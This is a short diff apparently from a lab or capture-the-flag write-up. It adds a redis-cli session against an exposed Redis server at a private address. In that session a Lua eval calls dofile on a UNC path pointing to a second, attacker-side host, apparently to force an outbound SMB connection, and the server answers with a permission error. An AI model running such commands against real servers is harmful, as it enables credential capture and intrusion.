@@ -216,3 +216,10 @@ used_cpu_user_children:0.00
 122) ""
 10.10.116.41:6379> 
 ```
+
+```
+redis-cli -h 10.10.116.41 -p 6379
+10.10.116.41:6379> eval "dofile('//10.8.117.56/test')" 0
+(error) ERR Error running script (call to f_82d193bf3f0b9f38538d1d2e9ffdbe905ff5e323): @user_script:1: cannot open //10.8.117.56/test: Permission denied 
+10.10.116.41:6379>
+```
